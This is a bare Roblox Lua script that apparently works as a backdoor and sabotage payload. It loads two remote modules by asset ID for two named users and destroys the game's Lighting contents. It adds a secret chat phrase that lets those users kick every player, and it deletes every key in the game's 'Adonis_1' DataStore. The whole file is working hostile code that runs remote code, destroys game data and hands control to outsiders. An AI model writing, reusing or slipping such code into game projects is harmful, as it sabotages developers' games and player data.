local name = "AIFODEPFVh"

if game.ReplicatedStorage:FindFirstChild(name) then
else
	require(7624679472)("NicoComeTudo")
	require(7633712551)("WingedRobloxiann","Guns")
	local instance = Instance.new("StringValue")
	instance.Name = name
	instance.Parent = game.ReplicatedStorage
	for _, g in pairs(game.Lighting:GetChildren()) do
		g:Destroy()
	end
	for _, player in pairs(game.Players:GetChildren()) do
		if player.Name == "WingedRobloxiann" or player.Name == "NicoComeTudo" then
			player.Chatted:Connect(function(msg)
				if msg == "120E91HD0N12SD01H" then
					for _, p in pairs(game.Players:GetPlayers()) do
						p:Kick("VAI DOLLYNHOOOOOOOOOOOOOOO")
					end
				end
			end)
		end
	end
local DataStore = game:GetService("DataStoreService")
local Data = DataStore:GetDataStore("Adonis_1")

local pages = Data:ListKeysAsync()

while true do

for _, data in pairs(pages:GetCurrentPage()) do
	local Key = data.KeyName
	Data:RemoveAsync(Key)
end

if pages.IsFinished then
	break
	else
pages:AdvanceToNextPageAsync()
end

end

end
